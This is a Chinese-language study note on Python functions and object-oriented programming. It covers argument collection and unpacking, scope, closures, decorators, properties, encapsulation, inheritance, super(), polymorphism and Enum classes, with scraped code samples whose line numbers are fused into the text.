函数printinfo( 10 )printinfo( 70, 60, 50 ) 以上实例输出结果： 123456输出:10输出:706050 此外，python还可以收集关键字参数，在参数面前**表示， 一个函数可以同时包括一个支持“普通“参数收集的参数和一个支持关键字参数收集的参数 123456789101112#!/usr/bin/python3 # 可写函数说明def printinfo( arg1, *hello, **vardict ): &quot;打印任何传入的参数&quot; print (&quot;输出: &quot;) print (arg1) print (hello) print (vardict) # 调用printinfo 函数printinfo(1, &quot;你好&quot;, &quot;hi&quot;, a=2,b=3) 以上实例输出结果： 12345输出: 1你好hi{'a': 2, 'b': 3} 声明函数时，参数中星号 ***** 可以单独出现，例如: 12def f(a,b,*,c): return a+b+c 如果单独出现星号 ***** 后的参数必须用关键字传入。 123456789&gt;&gt;&gt; def f(a,b,*,c):... return a+b+c... &gt;&gt;&gt; f(1,2,3) # 报错Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: f() takes 2 positional arguments but 3 were given&gt;&gt;&gt; f(1,2,c=3) # 正常6 逆向参数收集逆向参数收集，是指在程序已有列表、元组、字典等对象的前提下，把它们的元素“拆开”后传给函数的参数 逆向参数收集需要在传入的列表、元组参数之前添加一个星号，在字典参数之前添加两个星号 123456def test(name, message): print('用户是：', name) print('欢迎消息：', message)my_list = ['孙悟空', '欢迎来到水帘洞']test(*my_list) 实际上，即使是支持收集的参数，如果程序需要将一个元组传给该参数，那么同样需要使用逆向收集，例如以下代码： 123456def foo(name, *nums): print('name参数:', name) print('nums参数:', nums)my_tuple = (1, 2, 3)foo('fkit', *my_tuple) 输出如下： 12name参数：fkitnums参数：（1，2，3） 使用逆向收集，my_tuple第一个元素传给name参数，剩下的传给nums参数 1foo(*my_tuple) 输出如下： 12name参数：1nums参数：（2，3） 如果不使用逆向收集，整个元组将作为一个参数 12345foo(my_tuple)#输出name参数：（1，2，3）nums参数：（） 字典也支持逆向收集，字典将会以关键字的形式传入。 123456def bar(book, price, desc): print(book, '这本书的价格是：', price) print('描述信息：', desc)my_dict = {'price':89, 'book':'疯狂python讲义', 'desc':'这是一本系统全面的python学习图书'}bar(**mydict) 函数的参数传递机制 在python函数中对参数直接使用“=”符号赋值没有用 如果让函数修改某些数据，可以封装成列表字典等可变对象，再作为参数传入函数 变量作用域 局部变量 全局变量 globals()：返回全局范围内所有变量组成的“变量字典” locals()：返回当前局部范围内所有变量组成的“变量字典” vars(object)：获取在指定对象范围内所有变量组成的“变量字典” locals()在全局范围内调用=globals() globals()生成的字典修改会改变全局变量本身，locals()字典修改不会改变局部变量本身 局部遮蔽全局变量的处理： 访问一下被遮蔽的全局变量 在函数中声明全局变量 1global name 局部函数当出现局部函数内的变量遮蔽它所在函数内的局部变量时，可以定义nonlocal 1nonlocal name 区别： global：声明全局变量 nonlocal：声明访问当前函数所在函数内的局部变量 函数的高级内容使用函数变量当把函数赋值给变量之后，接下来程序也可通过变量来调用函数 使用函数作为函数形参12345678def func_a(func, *args, **kwargs): print(func(*args, **kwargs))def func_b(*args): return argsif __name__ == '__main__': func_a(func_b, 1, 2, 3) 在代码中，将函数func_b作为函数func_a的参数传入，将函数func_b的参数以元组args传入，并在调用func_b时，作为func_b的参数。 运行结果： 1(1, 2, 3) 但是这里存在一个问题，但func_a和func_b需要同名的参数时，就会出现异常，如： 123456789def func_a(arg_a, func, **kwargs): print(arg_a) print(func(**kwargs))def func_b(arg_a): print(arg_a)if __name__ == '__main__': func_a(arg_a='Hello Python', func=func_b) 异常信息： 1TypeError: func_b() missing 1 required positional argument: 'arg_a' 虽然通过修改，手动将arg_a作为参数传入func中进行调用，可以正常运行，但这明显不符合设计初衷：在func_a中执行func(**kwargs)时，很可能并不知道func到底需要什么参数。换句话说，如果已经提前知道需要调用什么函数，那完全不必要把函数作为参数传入另一个函数并调用，直接调用函数即可。 123456789def func_a(arg_a, func, **kwargs): print(arg_a) func(arg_a=arg_a, **kwargs)def func_b(arg_a): print(arg_a)if __name__ == '__main__': func_a(arg_a='Hello Python', func=func_b) 当加入第三个函数，func_c，它不需要arg_a这个参数时，就会出现问题。 12345678910111213def func_a(arg_a, func, **kwargs): print(arg_a) func(arg_a=arg_a, **kwargs)def func_b(arg_a): print(arg_a)def func_c(): print('Hello World')if __name__ == '__main__': func_a(arg_a='Hello Python', func=func_b) func_a(arg_a='Hello Python', func=func_c) 异常结果： 1TypeError: func_c() got an unexpected keyword argument 'arg_a' 目前想到的解决办法是尽量避免func_a存在跟其他函数相同的参数，比如把func_a的arg_a参数改成func_a_arg_a。 12345678910111213def func_a(func_a_arg_a, func, **kwargs): print(func_a_arg_a) func(**kwargs)def func_b(arg_a): print(arg_a)def func_c(): print('Hello World')if __name__ == '__main__': func_a(func_a_arg_a='temp', arg_a='Hello Python', func=func_b) func_a(func_a_arg_a='temp', func=func_c) 使用函数作为返回值函数作为返回值高阶函数除了可以接收函数作为参数外，还可以把函数作为结果值返回。 12345678910111213141516171819202122def lazy_sum(*args): def sum(): ax=0 for n in args: ax = ax + n return ax return sumf = lazy_sum(1,2,3,4,5)print f# &lt;function sum at 0x02657770&gt;# lazy_sum(1,2,3,4,5)返回的是一个指向求和的函数的函数名。# 在调用lazy_sum(1,2,3,4,5)的时候，不立刻求和，而是根据后面代码的需要在计算。print f()# 15# 用f()调用求和函数，计算出结果。f1 = lazy_sum(1,2,3,4,5,6)f2 = lazy_sum(1,2,3,4,5,6)print f1 == f2# False# lazy_sum()每调用一次，都会返回一个独一无二的函数地址。 例中，lazy_sum中的内部函数sum引用了外部函数lazy_sum的参数和局部变量，当lazy_sum返回函数sum时，相关参数和变量已经保存在返回的函数sum中了。我们称这为 闭包。 注意到返回的函数在其定义内部引用了局部变量args，所以，当一个函数返回了一个函数后，其内部的局部变量还被新函数引用，所以，闭包用起来简单，实现起来可不容易。 另一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了f()才执行。我们来看一个例子： 123456789101112131415def count(): fs = [] for i in range(1,4): def f(): return i*i fs.append(f) return fsf1, f2, f3 = count()print f1()print f2()print f3()# 9# 9# 9 结果全部都是9. 不是预期的1,4,9！ 遂在编辑器中不断更改并调试运行观察变量的变化过程： 12345678910111213141516171819# -*- coding: utf-8 -*-def count(): fs = [] for i in range(1,4): def f(): return i*i fs.append(f) return fs# f1, f2, f3 = count()#将上述代码分开写：f1 = count()f2 = count()f3 = count()print(f1())print(f2())print(f3()) 结果编译器报错： Traceback (most recent call last):File “***.py”, line 16, in print(f1())TypeError: ‘list’ object is not callable f1 = count()这条语句执行时，count()函数会先执行，并将结果fs（这是一个包含三个元素（值是三个不同函数）的list！）返还f1。所以f1()是将list当函数用，故报错！ f2 = count()和f3 = count()也是这个道理。 所以第一个要弄清楚的是 ：初始代码中的f1, f2, f3 = count()是将count() 中返回值（list）的三个元素（元素值是函数）分别赋值给f1,f2,f3!此时它们是函数！ 修改代码： 123456789101112131415161718# -*- coding: utf-8 -*-def count(): fs = [] for i in range(1,4): def f(): return i*i fs.append(f) return fs# f1, f2, f3 = count()f1 = count()f2 = count()f3 = count()print(f1[0]())print(f2[0]())print(f3[0]()) 结果仍然是： 9 9 9 因为f1[0]()中存放的就是函数f, 但此时i是3，故返回输出9！ 所以返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。 网上例子，有稍许啰嗦 局部函数与lambda表达式回顾局部函数…… 使用lambda表达式代替局部函数1lambda [parameter_list]: 表达式 lambda表达式必须使用lambda关键字定义 在lambda关键字后，冒号左边是参数列表，可以没有参数，也可以有多个参数，逗号隔开，冒号右边是lambda表达式的返回值 用途： 单行函数，省去了定义函数的过程，代码更加简洁 对于不需要多次使用的函数，lambda使用完后可以立即释放，提高了性能 类和对象类和对象定义类 __init__：构造方法，用于构造该类的对象 12class Student(object): pass 对象的产生和使用创建对象的根本途径是构造方法 1234567891011class Student(object): def __init__(self, name, score): self.name = name self.score = score &gt;&gt;&gt; bart = Student('Bart Simpson', 59)&gt;&gt;&gt; bart.name'Bart Simpson'&gt;&gt;&gt; bart.score59 动态增加实例变量 动态删除实例变量 del 为P对象动态增加方法，python不会自动将调用者自动绑定到第一个参数（即使将第一个参数命名为self也没用） 1234567891011# 先定义一个函数def info(self): print(&quot;---info函数---&quot;, self)# 使用info对p的foo方法赋值（动态增加方法）p.foo = info# python不会自动将调用者绑定到第一个参数# 因此程序需要手动将调用者绑定到第一参数p.foo(p)p.bar = lambda self: print(&quot;--lambda表达式---&quot;, self)p.bar(p) 如果希望动态增加的方法也能自动绑定到第一个参数，则可借助于types模块下的MethodType进行包装 12345678def intro_func(self, content): print(&quot;我是一个人，信息为：%s&quot; % content)# 导入MethodTypefrom types import MethodType# 使用MethodType对intro_func进行包装，将该函数的第一个参数绑定为pp.intro = MethodType(intro_func, p)# 第一个参数已经绑定了，无须传入p.intro(&quot;生活在别处&quot;) 实例方法和自动绑定self对于类中定义的实例方法，python会自动绑定方法的第一个参数，第一个参数总是指向调用该方法的对象 在构造方法中引用该构造方法正在初始化的对象 在普通实例方法中引用调用该方法的对象 当self参数作为对象的默认引用时，程序可以像访问普通变量一样来访问这个self参数，甚至可以把self参数当成实例方法的返回值 1234567891011class ReturnSelf: def grow(self): if hasattr(self, 'age'): self.age += 1 else: self.age = 1 return selfrs = ReturnSelf()rs.grow().grow().grow()print(&quot;rs的age属性值是：&quot;, rs.age)# 简洁，确可能造成实际意义的模糊 方法类也能调用实例方法使用类调用实例方法的第一个参数要绑定 1234567891011121314151617class User: def walk (self): print(self, '正在走') u = User()User.walk(u)&lt;__main__.User object at 0x0000015AD3CB1F48&gt; 正在走User.walk(User)&lt;class '__main__.User'&gt; 正在走User.walk('fg')fg 正在走 类方法与静态方法python支持定义类方法，甚至定义静态方法。 python会自动绑定类方法的第一个参数，类方法的第一个参数（通常建议参数名为cls）会自动绑定到类本身；静态方法则不会自动绑定。 类方法：@classmethod 静态方法：@staticmethod 123456789101112131415class Bird: @classmethod def fly(cls): print('类方法fly：', fly) @staticmethod def info(p): print('静态方法info：', p) Bird.fly()Bird.info('crazyit')b = Bird()b.fly()b.info('fkit') @函数装饰器使用“@函数”（A）装饰另一个函数（B）： 将被修饰的函数（B）作为参数传给@符号引用的函数（A） 将（B）替换（装饰）城成第一步的返回值 下面资料来源于网络： 函数中返回函数: 123456789101112131415161718192021def hi(name=&quot;yasoob&quot;): def greet(): return &quot;now you are in the greet() function&quot; def welcome(): return &quot;now you are in the welcome() function&quot; if name == &quot;yasoob&quot;: return greet else: return welcome a = hi()print(a)#outputs: &lt;function greet at 0x7f2143c01500&gt; #上面清晰地展示了`a`现在指向到hi()函数中的greet()函数#现在试试这个 print(a())#outputs: now you are in the greet() function 在 if/else 语句中我们返回 greet 和 welcome，而不是 greet() 和 welcome()。为什么那样？这是因为当你把一对小括号放在后面，这个函数就会执行；然而如果你不放括号在它后面，那它可以被到处传递，并且可以赋值给别的变量而不去执行它。 将函数作为参数传给另一个函数: 12345678910def hi(): return &quot;hi yasoob!&quot; def doSomethingBeforeHi(func): print(&quot;I am doing some boring work before executing hi()&quot;) print(func()) doSomethingBeforeHi(hi)#outputs:I am doing some boring work before executing hi()# hi yasoob! 装饰器： 123456789101112131415161718192021222324def a_new_decorator(a_func): def wrapTheFunction(): print(&quot;I am doing some boring work before executing a_func()&quot;) a_func() print(&quot;I am doing some boring work after executing a_func()&quot;) return wrapTheFunction@a_new_decoratordef a_function_requiring_decoration(): &quot;&quot;&quot;Hey you! Decorate me!&quot;&quot;&quot; print(&quot;I am the function which needs some decoration to &quot; &quot;remove my foul smell&quot;) a_function_requiring_decoration()#outputs: I am doing some boring work before executing a_func()# I am the function which needs some decoration to remove my foul smell# I am doing some boring work after executing a_func() #the @a_new_decorator is just a short way of saying:a_function_requiring_decoration = a_new_decorator(a_function_requiring_decoration) 在对 Python 装饰器的工作原理有一个基本的理解。如果我们运行如下代码会存在一个问题： 12print(a_function_requiring_decoration.__name__)# Output: wrapTheFunction 这并不是我们想要的！Ouput输出应该是”a_function_requiring_decoration”。这里的函数被warpTheFunction替代了。它重写了我们函数的名字和注释文档(docstring)。幸运的是Python提供给我们一个简单的函数来解决这个问题，那就是functools.wraps。我们修改上一个例子来使用functools.wraps： 123456789101112131415161718from functools import wraps def a_new_decorator(a_func): @wraps(a_func) def wrapTheFunction(): print(&quot;I am doing some boring work before executing a_func()&quot;) a_func() print(&quot;I am doing some boring work after executing a_func()&quot;) return wrapTheFunction @a_new_decoratordef a_function_requiring_decoration(): &quot;&quot;&quot;Hey yo! Decorate me!&quot;&quot;&quot; print(&quot;I am the function which needs some decoration to &quot; &quot;remove my foul smell&quot;) print(a_function_requiring_decoration.__name__)# Output: a_function_requiring_decoration 蓝本规范： 1234567891011121314151617181920from functools import wrapsdef decorator_name(f): @wraps(f) def decorated(*args, **kwargs): if not can_run: return &quot;Function will not run&quot; return f(*args, **kwargs) return decorated @decorator_namedef func(): return(&quot;Function is running&quot;) can_run = Trueprint(func())# Output: Function is running can_run = Falseprint(func())# Output: Function will not run 注意：@wraps接受一个函数来进行装饰，并加入了复制函数名称、注释文档、参数列表等等的功能。这可以让我们在装饰器里面访问在装饰之前的函数的属性。 使用场景： 授权： 装饰器能有助于检查某个人是否被授权去使用一个web应用的端点(endpoint)。它们被大量使用于Flask和Django web框架中。这里是一个例子来使用基于装饰器的授权： 12345678910from functools import wraps def requires_auth(f): @wraps(f) def decorated(*args, **kwargs): auth = request.authorization if not auth or not check_auth(auth.username, auth.password): authenticate() return f(*args, **kwargs) return decorated 日志： 日志是装饰器运用的另一个亮点。 1234567891011121314151617from functools import wraps def logit(func): @wraps(func) def with_logging(*args, **kwargs): print(func.__name__ + &quot; was called&quot;) return func(*args, **kwargs) return with_logging @logitdef addition_func(x): &quot;&quot;&quot;Do some math.&quot;&quot;&quot; return x + x result = addition_func(4)# Output: addition_func was called 带参数的装饰器： 在函数中嵌入装饰器 12345678910111213141516171819202122232425262728293031from functools import wraps def logit(logfile='out.log'): def logging_decorator(func): @wraps(func) def wrapped_function(*args, **kwargs): log_string = func.__name__ + &quot; was called&quot; print(log_string) # 打开logfile，并写入内容 with open(logfile, 'a') as opened_file: # 现在将日志打到指定的logfile opened_file.write(log_string + '\\n') return func(*args, **kwargs) return wrapped_function return logging_decorator @logit()def myfunc1(): pass myfunc1()# Output: myfunc1 was called# 现在一个叫做 out.log 的文件出现了，里面的内容就是上面的字符串 @logit(logfile='func2.log')def myfunc2(): pass myfunc2()# Output: myfunc2 was called# 现在一个叫做 func2.log 的文件出现了，里面的内容就是上面的字符串 装饰器类： 1234567891011121314151617181920212223from functools import wraps class logit(object): def __init__(self, logfile='out.log'): self.logfile = logfile def __call__(self, func): @wraps(func) def wrapped_function(*args, **kwargs): log_string = func.__name__ + &quot; was called&quot; print(log_string) # 打开logfile并写入 with open(self.logfile, 'a') as opened_file: # 现在将日志打到指定的文件 opened_file.write(log_string + '\\n') # 现在，发送一个通知 self.notify() return func(*args, **kwargs) return wrapped_function def notify(self): # logit只打日志，不做别的 pass 现在，我们给 logit 创建子类，来添加 email 的功能(虽然 email 这个话题不会在这里展开)。 123456789101112class email_logit(logit): ''' 一个logit的实现版本，可以在函数调用时发送email给管理员 ''' def __init__(self, email='admin@myproject.com', *args, **kwargs): self.email = email super(email_logit, self).__init__(*args, **kwargs) def notify(self): # 发送一封email到self.email # 这里就不做实现了 pass 装饰器执行顺序： 123456789101112131415161718192021222324252627282930313233def decorator_a(func): print 'Get in decorator_a' def inner_a(*args, **kwargs): print 'Get in inner_a' return func(*args, **kwargs) return inner_adef decorator_b(func): print 'Get in decorator_b' def inner_b(*args, **kwargs): print 'Get in inner_b' return func(*args, **kwargs) return inner_b@decorator_b@decorator_adef f(x): print 'Get in f' return x * 2# 运行结果：# Get in decorator_a# Get in decorator_bf(1)-------------------------------------------------------------------实际上运行的结果如下:Get in decorator_aGet in decorator_bGet in inner_bGet in inner_aGet in f 在实际应用的场景中，当我们采用上面的方式写了两个装饰方法比如先验证有没有登录 @login_required ， 再验证权限够不够时 @permision_allowed 时，我们采用下面的顺序来装饰函数: 12345@login_required@permision_alloweddef f() # Do something return 再论类命名空间…… 成员变量类变量和实例变量…… 使用property函数定义属性https://www.liaoxuefeng.com/wiki/1016959663602400/1017502538658208#0 在绑定属性时，如果我们直接把属性暴露出去，虽然写起来很简单，但是，没办法检查参数，导致可以把成绩随便改： 12s = Student()s.score = 9999 这显然不合逻辑。为了限制score的范围，可以通过一个set_score()方法来设置成绩，再通过一个get_score()来获取成绩，这样，在set_score()方法里，就可以检查参数： 1234567891011class Student(object): def get_score(self): return self._score def set_score(self, value): if not isinstance(value, int): raise ValueError('score must be an integer!') if value &lt; 0 or value &gt; 100: raise ValueError('score must between 0 ~ 100!') self._score = value 现在，对任意的Student实例进行操作，就不能随心所欲地设置score了： 12345678&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.set_score(60) # ok!&gt;&gt;&gt; s.get_score()60&gt;&gt;&gt; s.set_score(9999)Traceback (most recent call last): ...ValueError: score must between 0 ~ 100! 但是，上面的调用方法又略显复杂，没有直接用属性这么直接简单。 有没有既能检查参数，又可以用类似属性这样简单的方式来访问类的变量呢？对于追求完美的Python程序员来说，这是必须要做到的！ 还记得装饰器（decorator）可以给函数动态加上功能吗？对于类的方法，装饰器一样起作用。Python内置的@property装饰器就是负责把一个方法变成属性调用的： 12345678910111213class Student(object): @property def score(self): return self._score @score.setter def score(self, value): if not isinstance(value, int): raise ValueError('score must be an integer!') if value &lt; 0 or value &gt; 100: raise ValueError('score must between 0 ~ 100!') self._score = value @property的实现比较复杂，我们先考察如何使用。把一个getter方法变成属性，只需要加上@property就可以了，此时，@property本身又创建了另一个装饰器@score.setter，负责把一个setter方法变成属性赋值，于是，我们就拥有一个可控的属性操作： 12345678&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.score = 60 # OK，实际转化为s.set_score(60)&gt;&gt;&gt; s.score # OK，实际转化为s.get_score()60&gt;&gt;&gt; s.score = 9999Traceback (most recent call last): ...ValueError: score must between 0 ~ 100! 注意到这个神奇的@property，我们在对实例属性操作的时候，就知道该属性很可能不是直接暴露的，而是通过getter和setter方法来实现的。 还可以定义只读属性，只定义getter方法，不定义setter方法就是一个只读属性： 12345678910111213class Student(object): @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2015 - self._birth 上面的birth是可读写属性，而age就是一个只读属性，因为age可以根据birth和当前时间计算出来。 要特别注意：属性的方法名不要和实例变量重名。例如，以下的代码是错误的： 123456class Student(object): # 方法名称和实例变量均为birth: @property def birth(self): return self.birth 这是因为调用s.birth时，首先转换为方法调用，在执行return self.birth时，又视为访问self的属性，于是又转换为方法调用，造成无限递归，最终导致栈溢出报错RecursionError。 小结 @property广泛应用在类的定义中，可以让调用者写出简短的代码，同时保证对参数进行必要的检查，这样，程序运行时就减少了出错的可能性。 隐藏和封装封装、继承、多态 在Class内部，可以有属性和方法，而外部代码可以通过直接调用实例变量的方法来操作数据，这样，就隐藏了内部的复杂逻辑。 但是，从前面Student类的定义来看，外部代码还是可以自由地修改一个实例的name、score属性： 123456&gt;&gt;&gt; bart = Student('Bart Simpson', 59)&gt;&gt;&gt; bart.score59&gt;&gt;&gt; bart.score = 99&gt;&gt;&gt; bart.score99 如果要让内部属性不被外部访问，可以把属性的名称前加上两个下划线__，在Python中，实例的变量名如果以__开头，就变成了一个私有变量（private），只有内部可以访问，外部不能访问，所以，我们把Student类改一改： 12345678class Student(object): def __init__(self, name, score): self.__name = name self.__score = score def print_score(self): print('%s: %s' % (self.__name, self.__score)) 改完后，对于外部代码来说，没什么变动，但是已经无法从外部访问实例变量.__name和实例变量.__score了： 12345&gt;&gt;&gt; bart = Student('Bart Simpson', 59)&gt;&gt;&gt; bart.__nameTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: 'Student' object has no attribute '__name' 这样就确保了外部代码不能随意修改对象内部的状态，这样通过访问限制的保护，代码更加健壮。 但是如果外部代码要获取name和score怎么办？可以给Student类增加get_name和get_score这样的方法： 12345678class Student(object): ... def get_name(self): return self.__name def get_score(self): return self.__score 如果又要允许外部代码修改score怎么办？可以再给Student类增加set_score方法： 12345class Student(object): ... def set_score(self, score): self.__score = score 你也许会问，原先那种直接通过bart.score = 99也可以修改啊，为什么要定义一个方法大费周折？因为在方法中，可以对参数做检查，避免传入无效的参数： 12345678class Student(object): ... def set_score(self, score): if 0 &lt;= score &lt;= 100: self.__score = score else: raise ValueError('bad score') 需要注意的是，在Python中，变量名类似__xxx__的，也就是以双下划线开头，并且以双下划线结尾的，是特殊变量，特殊变量是可以直接访问的，不是private变量，所以，不能用__name__、__score__这样的变量名。 有些时候，你会看到以一个下划线开头的实例变量名，比如_name，这样的实例变量外部是可以访问的，但是，按照约定俗成的规定，当你看到这样的变量时，意思就是，“虽然我可以被访问，但是，请把我视为私有变量，不要随意访问”。 双下划线开头的实例变量是不是一定不能从外部访问呢？其实也不是。不能直接访问__name是因为Python解释器对外把__name变量改成了_Student__name，所以，仍然可以通过_Student__name来访问__name变量： 12&gt;&gt;&gt; bart._Student__name'Bart Simpson' 但是强烈建议你不要这么干，因为不同版本的Python解释器可能会把__name改成不同的变量名。 总的来说就是，Python本身没有任何机制阻止你干坏事，一切全靠自觉。 最后注意下面的这种错误写法： 123456&gt;&gt;&gt; bart = Student('Bart Simpson', 59)&gt;&gt;&gt; bart.get_name()'Bart Simpson'&gt;&gt;&gt; bart.__name = 'New Name' # 设置__name变量！&gt;&gt;&gt; bart.__name'New Name' 表面上看，外部代码“成功”地设置了__name变量，但实际上这个__name变量和class内部的__name变量不是一个变量！内部的__name变量已经被Python解释器自动改成了_Student__name，而外部代码给bart新增了一个__name变量。不信试试： 12&gt;&gt;&gt; bart.get_name() # get_name()内部返回self.__name'Bart Simpson' 类的继承继承的语法12class SubClass(SuperClass1, SuperClass2, ...): # 类定义部分 关于多继承如果多个父类中包含了同名的方法，排在前面的父类中的方法会“遮蔽”排在后面的父类中的同名方法 重写父类的方法父类的方法不适用子类时，在子类重新定义将其覆盖即可 使用未绑定方法调用被重写的方法123456789101112class BaseClass: def foo(self): print('父类中定义的foo方法')class SubClass(BaseClass): def foo(self): print('子类重写父类中的foo方法') def bar(self): print('执行bar方法') self.foo() BaseClass.foo(self)sc = SubClass()sc.bar() 123执行bar方法子类重写父类中的foo方法父类中定义的foo方法 使用super函数调用父类的构造方法python的子类也会继承父类的构造方法，如果子类有多个直接父类，那么排在前面的父类构造方法会被优先使用 为了让子类能同时初始化两个父类中的实例变量，子类需要定义自己的构造方法，即重写父类的构造方法。且如果子类重写了父类的构造方法，则子类的构造方法必须调用父类的构造方法。 super() 函数是用于调用父类(超类)的一个方法。 super() 是用来解决多重继承问题的，直接用类名调用父类方法在使用单继承的时候没问题，但是如果使用多继承，会涉及到查找顺序（MRO）、重复调用（钻石继承）等种种问题。 MRO 就是类的方法解析顺序表, 其实也就是继承父类方法时的顺序表。 以下是 super() 方法的语法: 1super(type[, object-or-type]) type – 类。 object-or-type – 类，一般是 self 123456789class A: def add(self, x): y = x+1 print(y)class B(A): def add(self, x): super().add(x)b = B()b.add(2) # 3 12345678910111213141516171819202122232425#!/usr/bin/python# -*- coding: UTF-8 -*- class FooParent(object): def __init__(self): self.parent = 'I\\'m the parent.' print ('Parent') def bar(self,message): print (&quot;%s from Parent&quot; % message) class FooChild(FooParent): def __init__(self): # super(FooChild,self) 首先找到 FooChild 的父类（就是类 FooParent），然后把类 FooChild 的对象转换为类 FooParent 的对象 super(FooChild,self).__init__() print ('Child') def bar(self,message): super(FooChild, self).bar(message) print ('Child bar fuction') print (self.parent) if __name__ == '__main__': fooChild = FooChild() fooChild.bar('HelloWorld') 1234567执行结果：ParentChildHelloWorld from ParentChild bar fuctionI'm the parent. python的动态性动态属性与__slots__希望为所有实例都添加方法，则可以通过为类添加方法来实现 __slots__属性可以限制性的为某个类动态添加属性和方法 __slots__属性值是一个元组，该元组的所有元素列出了该类的实例允许动态添加的所有属性名和方法名 __slots__属性并不限制通过类来动态添加属性或方法 __slots__属性指定的限制只对当前类的实例有效，该类派生出来的子类不起作用 使用type()函数定义类123456def fn(self): print('fn函数')# 使用type()定义dog类Dog = type('Dog', (object,), dict(walk=fn, age=6))# 创建Dog对象d = Dog() 参数一：创建的类名 参数二：该类继承的父类集合，元组形式 参数三：该字典对象为该类绑定的类变量和方法 使用metaclass没有 metaclass 的情况下，子类继承父类，父类是无法对子类执行操作的，但有了 metaclass，就可以对子类进行操作，就像装饰器那样可以动态定制和修改被装饰的类，metaclass 可以动态的定制或修改继承它的子类。 https://www.cnblogs.com/yssjun/p/9832526.html 多态1234567891011121314151617181920212223242526272829303132333435363738394041class Animal(object): def run(self): print('Animal is running...') class Dog(Animal): def run(self): print('Dog is running...')class Cat(Animal): def run(self): print('Cat is running...')def run_twice(animal): animal.run() animal.run() # 当我们传入Animal的实例时，run_twice()就打印出：&gt;&gt;&gt; run_twice(Animal())Animal is running...Animal is running...# 当我们传入Dog的实例时，run_twice()就打印出：&gt;&gt;&gt; run_twice(Dog())Dog is running...Dog is running...# 当我们传入Cat的实例时，run_twice()就打印出：&gt;&gt;&gt; run_twice(Cat())Cat is running...Cat is running...# 再定义一个Tortoise类型，也从Animal派生：class Tortoise(Animal): def run(self): print('Tortoise is running slowly...')&gt;&gt;&gt; run_twice(Tortoise())Tortoise is running slowly...Tortoise is running slowly... 你会发现，新增一个Animal的子类，不必对run_twice()做任何修改，实际上，任何依赖Animal作为参数的函数或者方法都可以不加修改地正常运行，原因就在于多态。 多态的好处就是，当我们需要传入Dog、Cat、Tortoise……时，我们只需要接收Animal类型就可以了，因为Dog、Cat、Tortoise……都是Animal类型，然后，按照Animal类型进行操作即可。由于Animal类型有run()方法，因此，传入的任意类型，只要是Animal类或者子类，就会自动调用实际类型的run()方法，这就是多态的意思： 对于一个变量，我们只需要知道它是Animal类型，无需确切地知道它的子类型，就可以放心地调用run()方法，而具体调用的run()方法是作用在Animal、Dog、Cat还是Tortoise对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种Animal的子类时，只要确保run()方法编写正确，不用管原来的代码是如何调用的。这就是著名的“开闭”原则： 对扩展开放：允许新增Animal子类； 对修改封闭：不需要修改依赖Animal类型的run_twice()等函数。 检查类型 issubclass(cls, class_or_tuple)：检查cls是否为后一个类或元组包含的多个类中任意类的子类 isinstance(obj, class_or_tuple)：检查obj是否为后一个类或元组包含的多个类中任意类的对象 issubclass第一个参数是类名，isinstance第一个参数是变量 第二个参数皆可以使用元组 __bases__属性：使用该属性可以查看该类的所有直接父类 __subclasses__()方法：使用该方法可以查看该类的所有直接子类 枚举类实例有限且固定的类称为枚举类 枚举入门 直接使用Enum列出多个枚举值来创建枚举类 通过继承Enum基类来派生枚举类 http://c.biancheng.net/view/2305.html 一些具有特殊含义的类，其实例化对象的个数往往是固定的，比如用一个类表示月份，则该类的实例对象最多有 12 个；再比如用一个类表示季节，则该类的实例化对象最多有 4 个。 针对这种特殊的类，Python 3.4 中新增加了 Enum 枚举类。也就是说，对于这些实例化对象个数固定的类，可以用枚举类来定义。 例如，下面程序演示了如何定义一个枚举类： 123456from enum import Enumclass Color(Enum): # 为序列值指定value值 red = 1 green = 2 blue = 3 如果想将一个类定义为枚举类，只需要令其继承自 enum 模块中的 Enum 类即可。例如在上面程序中，Color 类继承自 Enum 类，则证明这是一个枚举类。 在 Color 枚举类中，red、green、blue 都是该类的成员（可以理解为是类变量）。注意，枚举类的每个成员都由 2 部分组成，分别为 name 和 value，其中 name 属性值为该枚举值的变量名（如 red），value 代表该枚举值的序号（序号通常从 1 开始）。 和普通类的用法不同，枚举类不能用来实例化对象，但这并不妨碍我们访问枚举类中的成员。访问枚举类成员的方式有多种，例如以 Color 枚举类为例，在其基础上添加如下代码： 12345678910#调用枚举成员的 3 种方式print(Color.red)print(Color['red'])print(Color(1))#调取枚举成员中的 value 和 nameprint(Color.red.value)print(Color.red.name)#遍历枚举类中所有成员的 2 种方式for color in Color: print(color) 程序输出结果为： Color.redColor.redColor.red1redColor.redColor.greenColor.blue 枚举类成员之间不能比较大小，但可以用 == 或者 is 进行比较是否相等，例如： 12print(Color.red == Color.green)print(Color.red.name is Color.green.name) 输出结果为： FlaseFlase 需要注意的是，枚举类中各个成员的值，不能在类的外部做任何修改，也就是说，下面语法的做法是错误的： 1Color.red = 4 除此之外，该枚举类还提供了一个 members 属性，该属性是一个包含枚举类中所有成员的字典，通过遍历该属性，也可以访问枚举类中的各个成员。例如： 12for name,member in Color.__members__.items(): print(name,&quot;-&gt;&quot;,member) 输出结果为： red -&gt; Color.redgreen -&gt; Color.greenblue -&gt; Color.blue 值得一提的是，Python 枚举类中各个成员必须保证 name 互不相同，但 value 可以相同，举个例子： 123456from enum import Enumclass Color(Enum): # 为序列值指定value值 red = 1 green = 1 blue = 3 print(Color['green']) 输出结果为： Color.red 可以看到，Color 枚举类中 red 和 green 具有相同的值（都是 1），Python 允许这种情况的发生，它会将 green 当做是 red 的别名，因此当访问 green 成员时，最终输出的是 red。 在实际编程过程中，如果想避免发生这种情况，可以借助 @unique 装饰器，这样当枚举类中出现相同值的成员时，程序会报 ValueError 错误。例如： 12345678910#引入 uniquefrom enum import Enum,unique#添加 unique 装饰器@uniqueclass Color(Enum): # 为序列值指定value值 red = 1 green = 1 blue = 3 print(Color['green']) 运行程序会报错： Traceback (most recent call last): File “D:\\python3.6\\demo.py”, line 3, in class Color(Enum): File “D:\\python3.6\\lib\\enum.py”, line 834, in unique (enumeration, alias_details))ValueError: duplicate values found in &lt;enum ‘Color’&gt;: green -&gt; red 